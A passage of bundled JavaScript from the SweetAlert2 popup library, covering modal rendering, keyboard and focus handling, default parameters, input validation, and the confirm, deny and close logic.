        const lineEl = document.createElement("li");
        addClass(lineEl, swalClasses["progress-step-line"]);
        if (params.progressStepsDistance) {
          applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
        }
        return lineEl;
      };
      const renderTitle = (instance, params) => {
        const title = getTitle();
        toggle(title, params.title || params.titleText, "block");
        if (params.title) {
          parseHtmlToContainer(params.title, title);
        }
        if (params.titleText) {
          title.innerText = params.titleText;
        }
        applyCustomClass(title, params, "title");
      };
      const render = (instance, params) => {
        renderPopup(instance, params);
        renderContainer(instance, params);
        renderProgressSteps(instance, params);
        renderIcon(instance, params);
        renderImage(instance, params);
        renderTitle(instance, params);
        renderCloseButton(instance, params);
        renderContent(instance, params);
        renderActions(instance, params);
        renderFooter(instance, params);
        if (typeof params.didRender === "function") {
          params.didRender(getPopup());
        }
      };
      function hideLoading() {
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          return;
        }
        const domCache = privateProps.domCache.get(this);
        hide(domCache.loader);
        if (isToast()) {
          if (innerParams.icon) {
            show(getIcon());
          }
        } else {
          showRelatedButton(domCache);
        }
        removeClass([domCache.popup, domCache.actions], swalClasses.loading);
        domCache.popup.removeAttribute("aria-busy");
        domCache.popup.removeAttribute("data-loading");
        domCache.confirmButton.disabled = false;
        domCache.denyButton.disabled = false;
        domCache.cancelButton.disabled = false;
      }
      const showRelatedButton = (domCache) => {
        const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
        if (buttonToReplace.length) {
          show(buttonToReplace[0], "inline-block");
        } else if (allButtonsAreHidden()) {
          hide(domCache.actions);
        }
      };
      function getInput(instance) {
        const innerParams = privateProps.innerParams.get(instance || this);
        const domCache = privateProps.domCache.get(instance || this);
        if (!domCache) {
          return null;
        }
        return getInput$1(domCache.popup, innerParams.input);
      }
      const isVisible = () => {
        return isVisible$1(getPopup());
      };
      const clickConfirm = () => getConfirmButton() && getConfirmButton().click();
      const clickDeny = () => getDenyButton() && getDenyButton().click();
      const clickCancel = () => getCancelButton() && getCancelButton().click();
      const DismissReason = Object.freeze({
        cancel: "cancel",
        backdrop: "backdrop",
        close: "close",
        esc: "esc",
        timer: "timer"
      });
      const removeKeydownHandler = (globalState2) => {
        if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
          globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = false;
        }
      };
      const addKeydownHandler = (instance, globalState2, innerParams, dismissWith) => {
        removeKeydownHandler(globalState2);
        if (!innerParams.toast) {
          globalState2.keydownHandler = (e) => keydownHandler(instance, e, dismissWith);
          globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
          globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
          globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = true;
        }
      };
      const setFocus = (index, increment) => {
        const focusableElements = getFocusableElements();
        if (focusableElements.length) {
          index = index + increment;
          if (index === focusableElements.length) {
            index = 0;
          } else if (index === -1) {
            index = focusableElements.length - 1;
          }
          focusableElements[index].focus();
          return;
        }
        getPopup().focus();
      };
      const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
      const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
      const keydownHandler = (instance, event, dismissWith) => {
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams) {
          return;
        }
        if (event.isComposing || event.keyCode === 229) {
          return;
        }
        if (innerParams.stopKeydownPropagation) {
          event.stopPropagation();
        }
        if (event.key === "Enter") {
          handleEnter(instance, event, innerParams);
        } else if (event.key === "Tab") {
          handleTab(event);
        } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
          handleArrows(event.key);
        } else if (event.key === "Escape") {
          handleEsc(event, innerParams, dismissWith);
        }
      };
      const handleEnter = (instance, event, innerParams) => {
        if (!callIfFunction(innerParams.allowEnterKey)) {
          return;
        }
        if (event.target && instance.getInput() && event.target instanceof HTMLElement && event.target.outerHTML === instance.getInput().outerHTML) {
          if (["textarea", "file"].includes(innerParams.input)) {
            return;
          }
          clickConfirm();
          event.preventDefault();
        }
      };
      const handleTab = (event) => {
        const targetElement = event.target;
        const focusableElements = getFocusableElements();
        let btnIndex = -1;
        for (let i = 0; i < focusableElements.length; i++) {
          if (targetElement === focusableElements[i]) {
            btnIndex = i;
            break;
          }
        }
        if (!event.shiftKey) {
          setFocus(btnIndex, 1);
        } else {
          setFocus(btnIndex, -1);
        }
        event.stopPropagation();
        event.preventDefault();
      };
      const handleArrows = (key) => {
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        if (document.activeElement instanceof HTMLElement && ![confirmButton, denyButton, cancelButton].includes(document.activeElement)) {
          return;
        }
        const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
        let buttonToFocus = document.activeElement;
        for (let i = 0; i < getActions().children.length; i++) {
          buttonToFocus = buttonToFocus[sibling];
          if (!buttonToFocus) {
            return;
          }
          if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
            break;
          }
        }
        if (buttonToFocus instanceof HTMLButtonElement) {
          buttonToFocus.focus();
        }
      };
      const handleEsc = (event, innerParams, dismissWith) => {
        if (callIfFunction(innerParams.allowEscapeKey)) {
          event.preventDefault();
          dismissWith(DismissReason.esc);
        }
      };
      var privateMethods = {
        swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
        swalPromiseReject: /* @__PURE__ */ new WeakMap()
      };
      const setAriaHidden = () => {
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el) => {
          if (el === getContainer() || el.contains(getContainer())) {
            return;
          }
          if (el.hasAttribute("aria-hidden")) {
            el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden"));
          }
          el.setAttribute("aria-hidden", "true");
        });
      };
      const unsetAriaHidden = () => {
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el) => {
          if (el.hasAttribute("data-previous-aria-hidden")) {
            el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden"));
            el.removeAttribute("data-previous-aria-hidden");
          } else {
            el.removeAttribute("aria-hidden");
          }
        });
      };
      const iOSfix = () => {
        const iOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream || navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1;
        if (iOS && !hasClass(document.body, swalClasses.iosfix)) {
          const offset = document.body.scrollTop;
          document.body.style.top = `${offset * -1}px`;
          addClass(document.body, swalClasses.iosfix);
          lockBodyScroll();
          addBottomPaddingForTallPopups();
        }
      };
      const addBottomPaddingForTallPopups = () => {
        const ua = navigator.userAgent;
        const iOS = !!ua.match(/iPad/i) || !!ua.match(/iPhone/i);
        const webkit = !!ua.match(/WebKit/i);
        const iOSSafari = iOS && webkit && !ua.match(/CriOS/i);
        if (iOSSafari) {
          const bottomPanelHeight = 44;
          if (getPopup().scrollHeight > window.innerHeight - bottomPanelHeight) {
            getContainer().style.paddingBottom = `${bottomPanelHeight}px`;
          }
        }
      };
      const lockBodyScroll = () => {
        const container = getContainer();
        let preventTouchMove;
        container.ontouchstart = (event) => {
          preventTouchMove = shouldPreventTouchMove(event);
        };
        container.ontouchmove = (event) => {
          if (preventTouchMove) {
            event.preventDefault();
            event.stopPropagation();
          }
        };
      };
      const shouldPreventTouchMove = (event) => {
        const target = event.target;
        const container = getContainer();
        if (isStylus(event) || isZoom(event)) {
          return false;
        }
        if (target === container) {
          return true;
        }
        if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && target.tagName !== "TEXTAREA" && !(isScrollable(getHtmlContainer()) && getHtmlContainer().contains(target))) {
          return true;
        }
        return false;
      };
      const isStylus = (event) => {
        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
      };
      const isZoom = (event) => {
        return event.touches && event.touches.length > 1;
      };
      const undoIOSfix = () => {
        if (hasClass(document.body, swalClasses.iosfix)) {
          const offset = parseInt(document.body.style.top, 10);
          removeClass(document.body, swalClasses.iosfix);
          document.body.style.top = "";
          document.body.scrollTop = offset * -1;
        }
      };
      const fixScrollbar = () => {
        if (states.previousBodyPadding !== null) {
          return;
        }
        if (document.body.scrollHeight > window.innerHeight) {
          states.previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
          document.body.style.paddingRight = `${states.previousBodyPadding + measureScrollbar()}px`;
        }
      };
      const undoScrollbar = () => {
        if (states.previousBodyPadding !== null) {
          document.body.style.paddingRight = `${states.previousBodyPadding}px`;
          states.previousBodyPadding = null;
        }
      };
      function removePopupAndResetState(instance, container, returnFocus, didClose) {
        if (isToast()) {
          triggerDidCloseAndDispose(instance, didClose);
        } else {
          restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
          removeKeydownHandler(globalState);
        }
        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
        if (isSafari) {
          container.setAttribute("style", "display:none !important");
          container.removeAttribute("class");
          container.innerHTML = "";
        } else {
          container.remove();
        }
        if (isModal()) {
          undoScrollbar();
          undoIOSfix();
          unsetAriaHidden();
        }
        removeBodyClasses();
      }
      function removeBodyClasses() {
        removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
      }
      function close(resolveValue) {
        resolveValue = prepareResolveValue(resolveValue);
        const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
        const didClose = triggerClosePopup(this);
        if (this.isAwaitingPromise()) {
          if (!resolveValue.isDismissed) {
            handleAwaitingPromise(this);
            swalPromiseResolve(resolveValue);
          }
        } else if (didClose) {
          swalPromiseResolve(resolveValue);
        }
      }
      function isAwaitingPromise() {
        return !!privateProps.awaitingPromise.get(this);
      }
      const triggerClosePopup = (instance) => {
        const popup = getPopup();
        if (!popup) {
          return false;
        }
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
          return false;
        }
        removeClass(popup, innerParams.showClass.popup);
        addClass(popup, innerParams.hideClass.popup);
        const backdrop = getContainer();
        removeClass(backdrop, innerParams.showClass.backdrop);
        addClass(backdrop, innerParams.hideClass.backdrop);
        handlePopupAnimation(instance, popup, innerParams);
        return true;
      };
      function rejectPromise(error2) {
        const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
        handleAwaitingPromise(this);
        if (rejectPromise2) {
          rejectPromise2(error2);
        }
      }
      const handleAwaitingPromise = (instance) => {
        if (instance.isAwaitingPromise()) {
          privateProps.awaitingPromise.delete(instance);
          if (!privateProps.innerParams.get(instance)) {
            instance._destroy();
          }
        }
      };
      const prepareResolveValue = (resolveValue) => {
        if (typeof resolveValue === "undefined") {
          return {
            isConfirmed: false,
            isDenied: false,
            isDismissed: true
          };
        }
        return Object.assign({
          isConfirmed: false,
          isDenied: false,
          isDismissed: false
        }, resolveValue);
      };
      const handlePopupAnimation = (instance, popup, innerParams) => {
        const container = getContainer();
        const animationIsSupported = animationEndEvent && hasCssAnimation(popup);
        if (typeof innerParams.willClose === "function") {
          innerParams.willClose(popup);
        }
        if (animationIsSupported) {
          animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
        } else {
          removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
        }
      };
      const animatePopup = (instance, popup, container, returnFocus, didClose) => {
        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
        popup.addEventListener(animationEndEvent, function(e) {
          if (e.target === popup) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
          }
        });
      };
      const triggerDidCloseAndDispose = (instance, didClose) => {
        setTimeout(() => {
          if (typeof didClose === "function") {
            didClose.bind(instance.params)();
          }
          instance._destroy();
        });
      };
      function setButtonsDisabled(instance, buttons, disabled) {
        const domCache = privateProps.domCache.get(instance);
        buttons.forEach((button) => {
          domCache[button].disabled = disabled;
        });
      }
      function setInputDisabled(input, disabled) {
        if (!input) {
          return;
        }
        if (input.type === "radio") {
          const radiosContainer = input.parentNode.parentNode;
          const radios = radiosContainer.querySelectorAll("input");
          for (let i = 0; i < radios.length; i++) {
            radios[i].disabled = disabled;
          }
        } else {
          input.disabled = disabled;
        }
      }
      function enableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
      }
      function disableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
      }
      function enableInput() {
        setInputDisabled(this.getInput(), false);
      }
      function disableInput() {
        setInputDisabled(this.getInput(), true);
      }
      function showValidationMessage(error2) {
        const domCache = privateProps.domCache.get(this);
        const params = privateProps.innerParams.get(this);
        setInnerHtml(domCache.validationMessage, error2);
        domCache.validationMessage.className = swalClasses["validation-message"];
        if (params.customClass && params.customClass.validationMessage) {
          addClass(domCache.validationMessage, params.customClass.validationMessage);
        }
        show(domCache.validationMessage);
        const input = this.getInput();
        if (input) {
          input.setAttribute("aria-invalid", true);
          input.setAttribute("aria-describedby", swalClasses["validation-message"]);
          focusInput(input);
          addClass(input, swalClasses.inputerror);
        }
      }
      function resetValidationMessage() {
        const domCache = privateProps.domCache.get(this);
        if (domCache.validationMessage) {
          hide(domCache.validationMessage);
        }
        const input = this.getInput();
        if (input) {
          input.removeAttribute("aria-invalid");
          input.removeAttribute("aria-describedby");
          removeClass(input, swalClasses.inputerror);
        }
      }
      const defaultParams = {
        title: "",
        titleText: "",
        text: "",
        html: "",
        footer: "",
        icon: void 0,
        iconColor: void 0,
        iconHtml: void 0,
        template: void 0,
        toast: false,
        showClass: {
          popup: "swal2-show",
          backdrop: "swal2-backdrop-show",
          icon: "swal2-icon-show"
        },
        hideClass: {
          popup: "swal2-hide",
          backdrop: "swal2-backdrop-hide",
          icon: "swal2-icon-hide"
        },
        customClass: {},
        target: "body",
        color: void 0,
        backdrop: true,
        heightAuto: true,
        allowOutsideClick: true,
        allowEscapeKey: true,
        allowEnterKey: true,
        stopKeydownPropagation: true,
        keydownListenerCapture: false,
        showConfirmButton: true,
        showDenyButton: false,
        showCancelButton: false,
        preConfirm: void 0,
        preDeny: void 0,
        confirmButtonText: "OK",
        confirmButtonAriaLabel: "",
        confirmButtonColor: void 0,
        denyButtonText: "No",
        denyButtonAriaLabel: "",
        denyButtonColor: void 0,
        cancelButtonText: "Cancel",
        cancelButtonAriaLabel: "",
        cancelButtonColor: void 0,
        buttonsStyling: true,
        reverseButtons: false,
        focusConfirm: true,
        focusDeny: false,
        focusCancel: false,
        returnFocus: true,
        showCloseButton: false,
        closeButtonHtml: "&times;",
        closeButtonAriaLabel: "Close this dialog",
        loaderHtml: "",
        showLoaderOnConfirm: false,
        showLoaderOnDeny: false,
        imageUrl: void 0,
        imageWidth: void 0,
        imageHeight: void 0,
        imageAlt: "",
        timer: void 0,
        timerProgressBar: false,
        width: void 0,
        padding: void 0,
        background: void 0,
        input: void 0,
        inputPlaceholder: "",
        inputLabel: "",
        inputValue: "",
        inputOptions: {},
        inputAutoTrim: true,
        inputAttributes: {},
        inputValidator: void 0,
        returnInputValueOnDeny: false,
        validationMessage: void 0,
        grow: false,
        position: "center",
        progressSteps: [],
        currentProgressStep: void 0,
        progressStepsDistance: void 0,
        willOpen: void 0,
        didOpen: void 0,
        didRender: void 0,
        willClose: void 0,
        didClose: void 0,
        didDestroy: void 0,
        scrollbarPadding: true
      };
      const updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
      const deprecatedParams = {};
      const toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
      const isValidParameter = (paramName) => {
        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
      };
      const isUpdatableParameter = (paramName) => {
        return updatableParams.indexOf(paramName) !== -1;
      };
      const isDeprecatedParameter = (paramName) => {
        return deprecatedParams[paramName];
      };
      const checkIfParamIsValid = (param) => {
        if (!isValidParameter(param)) {
          warn(`Unknown parameter "${param}"`);
        }
      };
      const checkIfToastParamIsValid = (param) => {
        if (toastIncompatibleParams.includes(param)) {
          warn(`The parameter "${param}" is incompatible with toasts`);
        }
      };
      const checkIfParamIsDeprecated = (param) => {
        if (isDeprecatedParameter(param)) {
          warnAboutDeprecation(param, isDeprecatedParameter(param));
        }
      };
      const showWarningsForParams = (params) => {
        if (params.backdrop === false && params.allowOutsideClick) {
          warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
        }
        for (const param in params) {
          checkIfParamIsValid(param);
          if (params.toast) {
            checkIfToastParamIsValid(param);
          }
          checkIfParamIsDeprecated(param);
        }
      };
      function update(params) {
        const popup = getPopup();
        const innerParams = privateProps.innerParams.get(this);
        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
          warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
          return;
        }
        const validUpdatableParams = filterValidParams(params);
        const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
        render(this, updatedParams);
        privateProps.innerParams.set(this, updatedParams);
        Object.defineProperties(this, {
          params: {
            value: Object.assign({}, this.params, params),
            writable: false,
            enumerable: true
          }
        });
      }
      const filterValidParams = (params) => {
        const validUpdatableParams = {};
        Object.keys(params).forEach((param) => {
          if (isUpdatableParameter(param)) {
            validUpdatableParams[param] = params[param];
          } else {
            warn(`Invalid parameter to update: ${param}`);
          }
        });
        return validUpdatableParams;
      };
      function _destroy() {
        const domCache = privateProps.domCache.get(this);
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          disposeWeakMaps(this);
          return;
        }
        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
          globalState.swalCloseEventFinishedCallback();
          delete globalState.swalCloseEventFinishedCallback;
        }
        if (typeof innerParams.didDestroy === "function") {
          innerParams.didDestroy();
        }
        disposeSwal(this);
      }
      const disposeSwal = (instance) => {
        disposeWeakMaps(instance);
        delete instance.params;
        delete globalState.keydownHandler;
        delete globalState.keydownTarget;
        delete globalState.currentInstance;
      };
      const disposeWeakMaps = (instance) => {
        if (instance.isAwaitingPromise()) {
          unsetWeakMaps(privateProps, instance);
          privateProps.awaitingPromise.set(instance, true);
        } else {
          unsetWeakMaps(privateMethods, instance);
          unsetWeakMaps(privateProps, instance);
        }
      };
      const unsetWeakMaps = (obj, instance) => {
        for (const i in obj) {
          obj[i].delete(instance);
        }
      };
      var instanceMethods = /* @__PURE__ */ Object.freeze({
        __proto__: null,
        hideLoading,
        disableLoading: hideLoading,
        getInput,
        close,
        isAwaitingPromise,
        rejectPromise,
        handleAwaitingPromise,
        closePopup: close,
        closeModal: close,
        closeToast: close,
        enableButtons,
        disableButtons,
        enableInput,
        disableInput,
        showValidationMessage,
        resetValidationMessage,
        update,
        _destroy
      });
      const showLoading = (buttonToReplace) => {
        let popup = getPopup();
        if (!popup) {
          new Swal2();
        }
        popup = getPopup();
        const loader = getLoader();
        if (isToast()) {
          hide(getIcon());
        } else {
          replaceButton(popup, buttonToReplace);
        }
        show(loader);
        popup.setAttribute("data-loading", "true");
        popup.setAttribute("aria-busy", "true");
        popup.focus();
      };
      const replaceButton = (popup, buttonToReplace) => {
        const actions = getActions();
        const loader = getLoader();
        if (!buttonToReplace && isVisible$1(getConfirmButton())) {
          buttonToReplace = getConfirmButton();
        }
        show(actions);
        if (buttonToReplace) {
          hide(buttonToReplace);
          loader.setAttribute("data-button-to-replace", buttonToReplace.className);
        }
        loader.parentNode.insertBefore(loader, buttonToReplace);
        addClass([popup, actions], swalClasses.loading);
      };
      const handleInputOptionsAndValue = (instance, params) => {
        if (params.input === "select" || params.input === "radio") {
          handleInputOptions(instance, params);
        } else if (["text", "email", "number", "tel", "textarea"].includes(params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
          showLoading(getConfirmButton());
          handleInputValue(instance, params);
        }
      };
      const getInputValue = (instance, innerParams) => {
        const input = instance.getInput();
        if (!input) {
          return null;
        }
        switch (innerParams.input) {
          case "checkbox":
            return getCheckboxValue(input);
          case "radio":
            return getRadioValue(input);
          case "file":
            return getFileValue(input);
          default:
            return innerParams.inputAutoTrim ? input.value.trim() : input.value;
        }
      };
      const getCheckboxValue = (input) => input.checked ? 1 : 0;
      const getRadioValue = (input) => input.checked ? input.value : null;
      const getFileValue = (input) => input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
      const handleInputOptions = (instance, params) => {
        const popup = getPopup();
        const processInputOptions = (inputOptions) => {
          populateInputOptions[params.input](popup, formatInputOptions(inputOptions), params);
        };
        if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
          showLoading(getConfirmButton());
          asPromise(params.inputOptions).then((inputOptions) => {
            instance.hideLoading();
            processInputOptions(inputOptions);
          });
        } else if (typeof params.inputOptions === "object") {
          processInputOptions(params.inputOptions);
        } else {
          error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
        }
      };
      const handleInputValue = (instance, params) => {
        const input = instance.getInput();
        hide(input);
        asPromise(params.inputValue).then((inputValue) => {
          input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
          show(input);
          input.focus();
          instance.hideLoading();
        }).catch((err) => {
          error(`Error in inputValue promise: ${err}`);
          input.value = "";
          show(input);
          input.focus();
          instance.hideLoading();
        });
      };
      const populateInputOptions = {
        select: (popup, inputOptions, params) => {
          const select = getDirectChildByClass(popup, swalClasses.select);
          const renderOption = (parent, optionLabel, optionValue) => {
            const option = document.createElement("option");
            option.value = optionValue;
            setInnerHtml(option, optionLabel);
            option.selected = isSelected(optionValue, params.inputValue);
            parent.appendChild(option);
          };
          inputOptions.forEach((inputOption) => {
            const optionValue = inputOption[0];
            const optionLabel = inputOption[1];
            if (Array.isArray(optionLabel)) {
              const optgroup = document.createElement("optgroup");
              optgroup.label = optionValue;
              optgroup.disabled = false;
              select.appendChild(optgroup);
              optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
            } else {
              renderOption(select, optionLabel, optionValue);
            }
          });
          select.focus();
        },
        radio: (popup, inputOptions, params) => {
          const radio = getDirectChildByClass(popup, swalClasses.radio);
          inputOptions.forEach((inputOption) => {
            const radioValue = inputOption[0];
            const radioLabel = inputOption[1];
            const radioInput = document.createElement("input");
            const radioLabelElement = document.createElement("label");
            radioInput.type = "radio";
            radioInput.name = swalClasses.radio;
            radioInput.value = radioValue;
            if (isSelected(radioValue, params.inputValue)) {
              radioInput.checked = true;
            }
            const label = document.createElement("span");
            setInnerHtml(label, radioLabel);
            label.className = swalClasses.label;
            radioLabelElement.appendChild(radioInput);
            radioLabelElement.appendChild(label);
            radio.appendChild(radioLabelElement);
          });
          const radios = radio.querySelectorAll("input");
          if (radios.length) {
            radios[0].focus();
          }
        }
      };
      const formatInputOptions = (inputOptions) => {
        const result = [];
        if (typeof Map !== "undefined" && inputOptions instanceof Map) {
          inputOptions.forEach((value, key) => {
            let valueFormatted = value;
            if (typeof valueFormatted === "object") {
              valueFormatted = formatInputOptions(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        } else {
          Object.keys(inputOptions).forEach((key) => {
            let valueFormatted = inputOptions[key];
            if (typeof valueFormatted === "object") {
              valueFormatted = formatInputOptions(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        }
        return result;
      };
      const isSelected = (optionValue, inputValue) => {
        return inputValue && inputValue.toString() === optionValue.toString();
      };
      const handleConfirmButtonClick = (instance) => {
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.input) {
          handleConfirmOrDenyWithInput(instance, "confirm");
        } else {
          confirm(instance, true);
        }
      };
      const handleDenyButtonClick = (instance) => {
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.returnInputValueOnDeny) {
          handleConfirmOrDenyWithInput(instance, "deny");
        } else {
          deny(instance, false);
        }
      };
      const handleCancelButtonClick = (instance, dismissWith) => {
        instance.disableButtons();
        dismissWith(DismissReason.cancel);
      };
      const handleConfirmOrDenyWithInput = (instance, type) => {
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams.input) {
          error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
          return;
        }
        const inputValue = getInputValue(instance, innerParams);
        if (innerParams.inputValidator) {
          handleInputValidator(instance, inputValue, type);
        } else if (!instance.getInput().checkValidity()) {
          instance.enableButtons();
          instance.showValidationMessage(innerParams.validationMessage);
        } else if (type === "deny") {
          deny(instance, inputValue);
        } else {
          confirm(instance, inputValue);
        }
      };
      const handleInputValidator = (instance, inputValue, type) => {
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableInput();
        const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
        validationPromise.then((validationMessage) => {
          instance.enableButtons();
          instance.enableInput();
          if (validationMessage) {
            instance.showValidationMessage(validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
            confirm(instance, inputValue);
          }
        });
      };
      const deny = (instance, value) => {
        const innerParams = privateProps.innerParams.get(instance || void 0);
        if (innerParams.showLoaderOnDeny) {
          showLoading(getDenyButton());
        }
        if (innerParams.preDeny) {
          privateProps.awaitingPromise.set(instance || void 0, true);
          const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
          preDenyPromise.then((preDenyValue) => {
            if (preDenyValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              instance.close({
                isDenied: true,
                value: typeof preDenyValue === "undefined" ? value : preDenyValue
              });
            }
          }).catch((error2) => rejectWith(instance || void 0, error2));
        } else {
          instance.close({
            isDenied: true,
            value
          });
        }
      };
      const succeedWith = (instance, value) => {
        instance.close({
          isConfirmed: true,
          value
        });
      };
      const rejectWith = (instance, error2) => {
        instance.rejectPromise(error2);
      };
      const confirm = (instance, value) => {
        const innerParams = privateProps.innerParams.get(instance || void 0);
        if (innerParams.showLoaderOnConfirm) {
          showLoading();
        }
        if (innerParams.preConfirm) {
          instance.resetValidationMessage();
          privateProps.awaitingPromise.set(instance || void 0, true);
          const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
          preConfirmPromise.then((preConfirmValue) => {
            if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
            }
          }).catch((error2) => rejectWith(instance || void 0, error2));
        } else {
          succeedWith(instance, value);
        }
      };
      const handlePopupClick = (instance, domCache, dismissWith) => {
        const innerParams = privateProps.innerParams.get(instance);
        if (innerParams.toast) {
          handleToastClick(instance, domCache, dismissWith);
        } else {
          handleModalMousedown(domCache);
          handleContainerMousedown(domCache);
          handleModalClick(instance, domCache, dismissWith);
        }
      };
      const handleToastClick = (instance, domCache, dismissWith) => {
        domCache.popup.onclick = () => {
          const innerParams = privateProps.innerParams.get(instance);
          if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
            return;
          }
          dismissWith(DismissReason.close);
        };
      };
      const isAnyButtonShown = (innerParams) => {
        return innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton;
      };
      let ignoreOutsideClick = false;
      const handleModalMousedown = (domCache) => {
        domCache.popup.onmousedown = () => {
          domCache.container.onmouseup = function(e) {
            domCache.container.onmouseup = void 0;
            if (e.target === domCache.container) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      const handleContainerMousedown = (domCache) => {
        domCache.container.onmousedown = () => {
          domCache.popup.onmouseup = function(e) {
            domCache.popup.onmouseup = void 0;
            if (e.target === domCache.popup || domCache.popup.contains(e.target)) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      const handleModalClick = (instance, domCache, dismissWith) => {
        domCache.container.onclick = (e) => {
          const innerParams = privateProps.innerParams.get(instance);
          if (ignoreOutsideClick) {
            ignoreOutsideClick = false;
            return;
          }
          if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
            dismissWith(DismissReason.backdrop);
          }
        };
      };
      const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
      const isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
      const argsToParams = (args) => {
        const params = {};
        if (typeof args[0] === "object" && !isElement(args[0])) {
          Object.assign(params, args[0]);
        } else {
          ["title", "html", "icon"].forEach((name, index) => {
            const arg = args[index];
            if (typeof arg === "string" || isElement(arg)) {
              params[name] = arg;
            } else if (arg !== void 0) {
              error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
            }
          });
        }
        return params;
      };
      function fire() {
        const Swal3 = this;
        for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
          args[_key] = arguments[_key];
        }
